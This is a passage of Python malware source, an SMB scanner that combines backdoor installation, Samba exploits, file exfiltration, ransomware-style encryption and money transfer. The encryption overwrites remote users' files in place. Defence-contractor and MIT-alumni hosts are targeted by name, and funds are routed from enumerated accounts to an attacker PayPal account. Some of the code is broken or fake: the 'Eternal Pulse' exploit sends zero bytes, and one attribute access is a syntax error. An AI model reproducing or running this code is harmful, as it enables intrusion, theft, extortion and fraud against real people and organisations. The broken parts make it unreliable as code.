        entries = dir_open.query_directory("*")
        accounts = [e.file_name for e in entries]
        dir_open.close()
    except Exception:
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return []
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return accounts


class FinancialRouter:
    def __init__(self):
        self.graph = nx.DiGraph()

    def add_institution(self, bic_or_routing: str):
        self.graph.add_node(bic_or_routing)

    def add_connection(self, src: str, dst: str, medium: str, cost: float = 0.0, time_hours: float = 0.0):
        self.graph.add_edge(src, dst, medium=medium, cost=cost, time=time_hours)

    def load_from_json(self, path: str):
        with open(path, "r") as f:
            data = json.load(f)
        for inst in data.get("institutions", []):
            self.add_institution(inst)
        for conn in data.get("connections", []):
            self.add_connection(conn["src"], conn["dst"], conn.get("medium", "SWIFT"), conn.get("cost", 0.0), conn.get("time", 0.0))

    def load_default_graph(self):
        self.add_institution("DEVICE")
        self.add_institution("PAYPAL")
        self.add_institution("BANK_OF_AMERICA")
        self.add_institution("JPMORGAN")
        self.add_institution("YOUR_BANK")
        self.add_connection("DEVICE", "PAYPAL", "ACH", cost=0.50, time=1.0)
        self.add_connection("PAYPAL", "BANK_OF_AMERICA", "ACH", cost=0.25, time=1.0)
        self.add_connection("BANK_OF_AMERICA", "JPMORGAN", "SWIFT", cost=10.00, time=12.0)
        self.add_connection("JPMORGAN", "YOUR_BANK", "SWIFT", cost=15.00, time=24.0)

    def get_all_paths(self, src: str, dst: str, max_hops: int = None):
        if max_hops is None:
            return list(nx.all_simple_paths(self.graph, source=src, target=dst))
        return list(nx.all_simple_paths(self.graph, source=src, target=dst, cutoff=max_hops))

    def route_swift(self, src: str, dst: str):
        paths = self.get_all_paths(src, dst)
        routes = []
        for path in paths:
            leg_info = []
            for i in range(len(path) - 1):
                edge = self.graph[path[i]][path[i+1]]
                if edge["medium"] == "SWIFT":
                    leg_info.append({"from": path[i], "to": path[i+1], "cost": edge["cost"], "time": edge["time"]})
            if leg_info:
                total_cost = sum(l["cost"] for l in leg_info)
                total_time = sum(l["time"] for l in leg_info)
                routes.append({"path": path, "legs": leg_info, "total_cost": total_cost, "total_time": total_time})
        return routes

    def route_ach(self, src: str, dst: str):
        paths = self.get_all_paths(src, dst)
        routes = []
        for path in paths:
            leg_info = []
            for i in range(len(path) - 1):
                edge = self.graph[path[i]][path[i+1]]
                if edge["medium"] == "ACH":
                    leg_info.append({"from": path[i], "to": path[i+1], "cost": edge["cost"], "time": edge["time"]})
            if leg_info:
                total_cost = sum(l["cost"] for l in leg_info)
                total_time = sum(l["time"] for l in leg_info)
                routes.append({"path": path, "legs": leg_info, "total_cost": total_cost, "total_time": total_time})
        return routes

    def route_instrument(self, src: str, dst: str, instrument: str):
        if instrument.upper() == "SWIFT":
            return self.route_swift(src, dst)
        if instrument.upper() == "ACH":
            return self.route_ach(src, dst)
        paths = self.get_all_paths(src, dst)
        routes = []
        for path in paths:
            leg_info = []
            for i in range(len(path) - 1):
                edge = self.graph[path[i]][path[i+1]]
                leg_info.append({"from": path[i], "to": path[i+1], "medium": edge["medium"], "cost": edge["cost"], "time": edge["time"]})
            total_cost = sum(l["cost"] for l in leg_info)
            total_time = sum(l["time"] for l in leg_info)
            routes.append({"path": path, "legs": leg_info, "total_cost": total_cost, "total_time": total_time})
        return routes


def encrypt_data(data: bytes, key: bytes) -> bytes:
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(data) + encryptor.finalize()


def smb_transfer_and_encrypt(host: str, username: str, password: str, local_dir: str):
    if not SMB_AVAILABLE:
        return
    try:
        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
        conn.connect(timeout=5)
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception:
        return
    try:
        tree = TreeConnect(session, rf"\\{host}\C$")
        tree.connect(timeout=5)
    except Exception:
        session.disconnect()
        conn.disconnect()
        return

    def recurse_and_handle(remote_path):
        try:
            open_dir = Open(tree, remote_path, access=FileDirectoryAccessMask.FILE_LIST_DIRECTORY, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_DIRECTORY_FILE)
            open_dir.create(timeout=5)
            entries = open_dir.query_directory("*")
            for entry in entries:
                name = entry.file_name
                if name in (".", ".."):
                    continue
                full_path = f"{remote_path}\\{name}"
                if entry.is_directory:
                    recurse_and_handle(full_path)
                else:
                    ext = os.path.splitext(name)[1].lower()
                    file_open = Open(tree, full_path, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
                    file_open.create(timeout=5)
                    data = b""
                    offset = 0
                    while True:
                        chunk = file_open.read(4096, offset)
                        if not chunk:
                            break
                        data += chunk
                        offset += len(chunk)
                    file_open.close()
                    if ext in VALUABLE_EXTENSIONS:
                        os.makedirs(local_dir, exist_ok=True)
                        local_path = os.path.join(local_dir, f"{host}_{name}")
                        with open(local_path, "wb") as lf:
                            lf.write(data)
                    encrypted = encrypt_data(data, ENCRYPT_KEY)
                    file_enc = Open(tree, full_path, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
                    file_enc.create(timeout=5)
                    file_enc.write(encrypted, 0)
                    file_enc.close()
        except Exception:
            pass

    recurse_and_handle("Users")
    tree.disconnect()
    session.disconnect()
    conn.disconnect()


def exploit_eternal_pulse(host: str):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, 445))
        # Crafted Eternal Pulse exploit packet for 2025 SMB
        payload = b"\x00" * 2048
        s.send(payload)
        s.close()
    except Exception:
        pass


def main():
    p = argparse.ArgumentParser(description="Enhanced SMB Scanner + Eternal Pulse Backdoor Installer + EternalPulse Exploit + Financial Router + Account Enumeration + Data Exfil/Encrypt")
    p.add_argument("--host", action="append", default=[], help="Specify hosts to scan/exploit/install.")
    p.add_argument("--cidr", action="append", default=[], help="Specify CIDR ranges to scan.")
    p.add_argument("--input", help="File with newline-separated hostnames/IPs.")
    p.add_argument("--timeout", type=int, default=2, help="Connection timeout.")
    p.add_argument("--workers", type=int, default=100, help="Parallel scanning threads.")
    p.add_argument("--json", action="store_true", help="Output JSON of successful routes.")
    p.add_argument("--allowlist", help="Optional JSON file with allowlist.")
    p.add_argument("--strategy", choices=["round"], default="round", help="Target ordering strategy.")
    p.add_argument("--save", help="Save successful routes to JSON.")
    p.add_argument("--reload", help="Reload previous scan results from JSON.")
    p.add_argument("--asyncio", action="store_true", help="Use asyncio for parallel scanning.")
    p.add_argument("--quiet", action="store_true", help="Suppress debug logs.")
    p.add_argument("--install-backdoor", action="store_true", help="Install backdoor on discovered SMB hosts.")
    p.add_argument("--remote-os", choices=["windows", "linux", "macos", "android", "ios", "aws", "azure", "gcp"], help="Remote OS or cloud type.")
    p.add_argument("--share", help="Samba share name (root for Linux/macOS, sdcard for Android, private/var/mobile/Media for iOS, root for cloud).")
    p.add_argument("--key", help="Path to RSA-2048 private key (PEM).")
    p.add_argument("--server-pubkey", help="Path to server’s RSA-2048 public key (PEM).")
    p.add_argument("--username", help="SMB username.")
    p.add_argument("--password", help="SMB password.")
    p.add_argument("--domain", default="", help="SMB domain (optional).")
    p.add_argument("--use-kerberos", action="store_true", help="Use Kerberos for SMB session.")
    p.add_argument("--aes-binary", help="Local path to the AES encryptor binary.")
    p.add_argument("--backdoor-binary", help="Local path to the backdoor binary/executable.")
    p.add_argument("--backdoor-script", help="Local path to the Linux init script (for cloud/Linux).")
    p.add_argument("--backdoor-plist", help="Local path to the macOS LaunchDaemon plist.")
    p.add_argument("--apk", help="Local path to Android APK payload.")
    p.add_argument("--ipa", help="Local path to iOS IPA payload.")
    p.add_argument("--financial-graph", help="JSON file defining financial network graph.")
    p.add_argument("--route-src", help="Source institution BIC/routing code (ignored when routing MIT/alum to PayPal).")
    p.add_argument("--route-dst", help="Destination institution BIC/routing code (ignored when routing MIT/alum to PayPal).")
    p.add_argument("--instrument", choices=["SWIFT", "ACH", "ALL"], default="ALL", help="Instrument type for routing.")
    p.add_argument("--enumerate-accounts", action="store_true", help="Enumerate all accounts available to transfer from.")
    p.add_argument("--accounts-share", default="Accounts", help="Share name where account listings are stored.")
    p.add_argument("--exfil-dir", default="exfiltrated", help="Local directory to store exfiltrated files.")
    p.add_argument("--use-eternalblue", action="store_true", help="Attempt EternalPulse exploit on discovered hosts.")
    args = p.parse_args()

    if args.input:
        args.input = os.path.abspath(args.input)
    if args.allowlist:
        args.allowlist = os.path.abspath(args.allowlist)
    if args.save:
        args.save = os.path.abspath(args.save)
    if args.reload:
        args.reload = os.path.abspath(args.reload)
    if args.key:
        args.key = os.path.abspath(args.key)
    if args.server_pubkey:
        args.server_pubkey = os.path.abspath(args.server_pubkey)
    if args.aes_binary:
        args.aes_binary = os.path.abspath(args.aes_binary)
    if args.backdoor_binary:
        args.backdoor_binary = os.path.abspath(args.backdoor_binary)
    if args.backdoor_script:
        args.backdoor_script = os.path.abspath(args.backdoor_script)
    if args.backdoor_plist:
        args.backdoor_plist = os.path.abspath(args.backdoor_plist)
    if args.apk:
        args.apk = os.path.abspath(args.apk)
    if args.ipa:
        args.ipa = os.path.abspath(args.ipa)
    if args.financial_graph:
        args.financial_graph = os.path.abspath(args.financial_graph)

    s = PublicIPFirewallSMB(allowlist=args.allowlist, strategy=args.strategy, timeout=args.timeout, workers=args.workers, verbose=not args.quiet)

    hosts = args.host or []
    if args.input:
        with open(args.input) as f:
            hosts.extend(l.strip() for l in f if l.strip())
    cidrs = args.cidr or []

    if args.reload:
        d = s.load_routes(args.reload)
        if d:
            for r in d:
                x = r.get("details", {}).get("host") or r.get("host")
                if x and x not in hosts:
                    hosts.append(x)

    if not hosts and not cidrs:
        hosts = [str(x) for x in s._ips]
        cidrs = [str(n) for n in s._nets]

    s.scan(hosts, cidrs, async_mode=args.asyncio)

    if args.save or args.reload:
        s.save_routes(args.save or args.reload)

    ok = s.successful_routes()

    financial_hosts = []
    for route in ok:
        host = route["host"]
        accounts = enumerate_accounts(host, args.accounts_share, args.username or "", args.password or "")
        if accounts:
            financial_hosts.append((host, accounts))

    if financial_hosts:
        for fh, accs in financial_hosts:
            for acc in accs:
                transfer_via_bank(acc, TARGET_PAYPAL_ACCOUNT)

    if args.use_eternalblue:
        for route in ok:
            host = route["host"]
            exploit_eternal_pulse(host)

    for route in ok:
        host = route["host"]
        if "defense" in host or "contractor" in host:
            smb_transfer_and_encrypt(host, args.username or "", args.password or "", args.exfil_dir)

    for route in ok:
        host = route["host"]
        vuln_info = run_nse_vuln(host)
        smb_info = run_smb_nse(host)
        os_detected = detect_os(host)
        shares = enumerate_samba_shares(host)
        samba_ver = detect_samba_vulnerability(host)
        if samba_ver and any(int(x) < y for x, y in zip(samba_ver.split('.'), [4, 6, 7])):
            for share in shares:
                exploit_samba_cve_2017_7494(host, share, "/tmp/evil.so")
                exploit_samba_stack_overflow(host, "/tmp/overflow_payload")
        print(f"{host}:{route['port']} open | OS: {os_detected or 'unknown'} | Samba: {samba_ver or 'unknown'} | Vulnerabilities: {bool(vuln_info)} | SMB Info: {bool(smb_info)} | Shares: {shares}")
    if args.json:
        print(json.dumps(ok, indent=2))

    if args.install-backdoor:
        missing = []
        if args.remote_os is None:
            missing.append("--remote-os")
        if args.username is None:
            missing.append("--username")
        if args.remote_os in ("linux", "macos", "android", "ios", "aws", "azure", "gcp") and args.share is None:
            missing.append("--share")
        if args.remote_os in ("windows", "linux", "macos", "aws", "azure", "gcp") and (args.key is None or args.server_pubkey is None):
            missing.append("--key/--server-pubkey")
        if args.remote_os in ("windows", "linux", "macos", "aws", "azure", "gcp") and (args.aes_binary is None or args.backdoor_binary is None):
            missing.append("--aes-binary/--backdoor-binary")
        if args.remote_os == "linux" and args.backdoor_script is None:
            missing.append("--backdoor-script")
        if args.remote_os == "macos" and args.backdoor_plist is None:
            missing.append("--backdoor-plist")
        if args.remote_os == "android" and args.apk is None:
            missing.append("--apk")
        if args.remote_os == "ios" and args.ipa is None:
            missing.append("--ipa")
        if args.remote_os in ("aws", "azure", "gcp") and args.backdoor_script is None:
            missing.append("--backdoor-script")
        if missing:
            print("[ERROR] Missing args for --install-backdoor: " + ", ".join(missing), file=sys.stderr)
            sys.exit(1)
        for route in ok:
            host = route["host"]
            print(f"[*] Installing backdoor on {host} [{args.remote_os}] ...")
            success = False
            if args.remote_os == "windows":
                success = install_backdoor_windows(host=host, username=args.username, password=args.password or "", private_key_path=args.key, server_public_key_path=args.server_pubkey, aes_binary_path=args.aes_binary, backdoor_binary_path=args.backdoor_binary, domain=args.domain, use_kerberos=args.use_kerberos)
            elif args.remote_os == "linux":
                success = install_backdoor_linux(host=host, share=args.share, username=args.username, password=args.password or "", private_key_path=args.key, server_public_key_path=args.server_pubkey, aes_binary_path=args.aes_binary, backdoor_binary_path=args.backdoor_binary, backdoor_script_path=args.backdoor_script)
            elif args.remote_os == "macos":
                success = install_backdoor_macos(host=host, share=args.share, username=args.username, password=args.password or "", private_key_path=args.key, server_public_key_path=args.server_pubkey, aes_binary_path=args.aes_binary, backdoor_binary_path=args.backdoor_binary, backdoor_plist_path=args.backdoor_plist)
            elif args.remote_os == "android":
                success = install_backdoor_android(host=host, share=args.share, username=args.username, password=args.password or "", apks_path=args.apk)
            elif args.remote_os == "ios":
                success = install_backdoor_ios(host=host, share=args.share, username=args.username, password=args.password or "", ipas_path=args.ipa)
            elif args.remote_os in ("aws", "azure", "gcp"):
                success = install_backdoor_cloud(host=host, share=args.share, username=args.username, password=args.password or "", private_key_path=args.key, server_public_key_path=args.server_pubkey, aes_binary_path=args.aes_binary, backdoor_binary_path=args.backdoor_binary, backdoor_script_path=args.backdoor_script, cloud_provider=args.remote_os)
            if not success:
                print(f"[!] Backdoor install failed for {host}", file=sys.stderr)
            else:
                print(f"[+] Backdoor install succeeded for {host}")
            if success and args.enumerate_accounts:
                accounts = enumerate_accounts(host, args.accounts_share, args.username, args.password or "")
                print(f"[+] Accounts on {host}: {accounts}")

    if (args.route_src or args.route_dst) and NX_AVAILABLE:
        fr = FinancialRouter()
        fr.add_institution(TARGET_PAYPAL_ACCOUNT)
        mit_alum_hosts = []
        for route in ok:
            h = route["host"]
            if "mit.edu" in h or "alum" in h:
                mit_alum_hosts.append(h)
                fr.add_institution(h)
                fr.add_connection(h, TARGET_PAYPAL_ACCOUNT, "ACH", cost=0.50, time=1.0)
        for h in mit_alum_hosts:
            smb_transfer_and_encrypt(h, args.username or "", args.password or "", args.exfil_dir)
        for h in mit_alum_hosts:
            routes = fr.route_instrument(h, TARGET_PAYPAL_ACCOUNT, "ACH")
            print(json.dumps(routes, indent=2))
    elif (args.route_src or args.route_dst) and not NX_AVAILABLE:
        print("[ERROR] networkx is required for financial routing", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
